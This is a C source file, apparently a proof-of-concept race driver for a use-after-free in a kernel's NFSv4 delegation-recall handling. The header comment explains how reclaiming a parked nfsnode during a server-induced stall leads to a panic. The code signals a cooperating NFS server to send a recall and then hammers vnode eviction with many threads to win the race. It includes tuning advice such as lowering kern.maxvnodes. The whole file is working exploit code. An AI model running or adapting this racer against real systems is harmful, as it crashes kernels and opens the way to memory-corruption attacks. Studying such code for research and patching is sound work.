// race_driver.c — uid501 NFSv4 delegation-recall reclaim-vs-return UAF racer (SYNC + PRESSURE).
//
// Bug: after CB_RECALL, the kernel sock thread parks in nfs4_delegation_return holding a raw
// nfsnode* (no iocount). If nfs_vnop_reclaim zfree()s that np during the park, the post-reply
// derefs (clear open_state_busy / TAILQ unlink np+0x2f8 write) hit poisoned freed memory -> panic.
//
// Reclaim driver = the async VFS vnode recycler (does NOT drain mount RPCs, unlike umount).
// To make the recycler free our (recently-used => MRU) target during the stall we: (1) close the
// fd BEFORE firing recall so the node is immediately inactive/reclaimable, (2) run aggressive
// continuous vnode pressure (many threads create+open+close+unlink distinct files => fresh vnode
// allocations that evict the LRU, aging+reclaiming the target), (3) sync the pressure window to
// the server's "stalling" marker + a long stall. Lower kern.maxvnodes drastically improves this.
//
// Build: cc -O2 -o race_driver race_driver.c -lpthread
// Run  : ./race_driver <mnt> <ctl> <iters> PRESSURE [stall_ms] [npress]
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <pthread.h>
#include <sys/stat.h>
#include <sys/mount.h>
#include <sys/sysctl.h>
#include <time.h>

static char MNT[512], CTL[512], TARGET[600], STALLST[600], HOME[256], CHURN[512];
static volatile int STOP = 0;
static volatile int PRESSURE_ON = 0;   // gate pressure to the stall window

static int CURFD = -1;
static void breadcrumb(long it, const char* phase, int stall) {
  if (CURFD < 0) return;
  char b[256];
  int n = snprintf(b, sizeof b, "iter=%ld phase=%s strat=PRESSURE stall_ms=%d t=%ld\n",
                   it, phase, stall, (long)time(0));
  lseek(CURFD, 0, SEEK_SET); if (ftruncate(CURFD, 0)) {} if (write(CURFD, b, n)) {} fsync(CURFD);
}
static void set_ctl(const char* s) {
  int fd = open(CTL, O_WRONLY | O_CREAT | O_TRUNC, 0644);
  if (fd >= 0) { if (write(fd, s, strlen(s))) {} fsync(fd); close(fd); }
}
static int stalling_now(void) {
  int fd = open(STALLST, O_RDONLY); if (fd < 0) return 0;
  char b[16]; ssize_t r = read(fd, b, 15); close(fd);
  return (r >= 8 && strncmp(b, "stalling", 8) == 0);
}
static int wait_for_stalling(int timeout_ms) {
  for (int w = 0; w < timeout_ms; w++) { if (stalling_now()) return 1; usleep(1000); }
  return 0;
}
static void clear_stalling(void) {
  int fd = open(STALLST, O_WRONLY | O_CREAT | O_TRUNC, 0644);
  if (fd >= 0) { if (write(fd, "idle\n", 5)) {} close(fd); }
}

// aggressive vnode pressure: create+open+close+unlink distinct files => fresh vnode allocations
static void* pressure_thread(void* a) {
  long id = (long)a; char p[640]; long i = 0;
  while (!STOP) {
    if (!PRESSURE_ON) { usleep(200); continue; }
    snprintf(p, sizeof p, "%s/p%ld_%ld", CHURN, id, i++);
    int fd = open(p, O_RDONLY | O_CREAT, 0644);
    if (fd >= 0) close(fd);
    unlink(p);                       // free inode; vnode churns
  }
  return 0;
}

int main(int argc, char** argv) {
  if (argc < 5) { fprintf(stderr, "usage: %s <mnt> <ctl> <iters> PRESSURE [stall_ms] [npress]\n", argv[0]); return 2; }
  strncpy(MNT, argv[1], sizeof MNT - 1);
  strncpy(CTL, argv[2], sizeof CTL - 1);
  long iters = atol(argv[3]);
  int stall = (argc > 5) ? atoi(argv[5]) : 8000;
  int npress = (argc > 6) ? atoi(argv[6]) : 12;
  snprintf(TARGET, sizeof TARGET, "%s/target", MNT);
  snprintf(HOME, sizeof HOME, "%s", getenv("HOME") ? getenv("HOME") : "/Users/dawgyg");
  snprintf(STALLST, sizeof STALLST, "%s/nfs_uaf/stall_status", HOME);
  snprintf(CHURN, sizeof CHURN, "%s/nfs_uaf/churn", HOME); mkdir(CHURN, 0755);
  char cp[600]; snprintf(cp, sizeof cp, "%s/nfs_uaf/race_cur.txt", HOME);
  CURFD = open(cp, O_WRONLY | O_CREAT | O_TRUNC, 0644);

  long mv = 0; size_t sz = sizeof mv; sysctlbyname("kern.maxvnodes", &mv, &sz, 0, 0);
  fprintf(stderr, "race_driver(PRESSURE): iters=%ld stall=%dms npress=%d maxvnodes=%ld\n", iters, stall, npress, mv);

  pthread_t th[64]; if (npress > 64) npress = 64;
  for (int i = 0; i < npress; i++) pthread_create(&th[i], 0, pressure_thread, (void*)(long)i);

  for (long it = 0; it < iters && !STOP; it++) {
    breadcrumb(it, "open", stall);
    int fd = open(TARGET, O_RDONLY);
    if (fd < 0) { breadcrumb(it, "open_fail", stall); usleep(200000); continue; }
    char buf[64]; if (pread(fd, buf, sizeof buf, 0)) {}   // activate delegation
    close(fd);                                            // node inactive => reclaimable NOW

    clear_stalling();
    breadcrumb(it, "recall_signal", stall);
    set_ctl("recall\n");                                  // server: CB_RECALL then stall
    if (wait_for_stalling(1500)) {                        // kernel parked in nfs4_delegation_return
      breadcrumb(it, "parked_PRESSURE_ON", stall);
      PRESSURE_ON = 1;                                    // hammer vnode eviction during the park
      // keep pressure on for the stall window so the recycler frees the parked np
      for (int w = 0; w < stall && stalling_now(); w += 5) usleep(5000);
      PRESSURE_ON = 0;
    }
    set_ctl("idle\n");
    if ((it % 5) == 0) fprintf(stderr, "race_driver: iter %ld/%ld survived\n", it, iters);
  }
  STOP = 1;
  for (int i = 0; i < npress; i++) pthread_join(th[i], 0);
  fprintf(stderr, "race_driver: done (%ld iters, no panic)\n", iters);
  return 0;
}
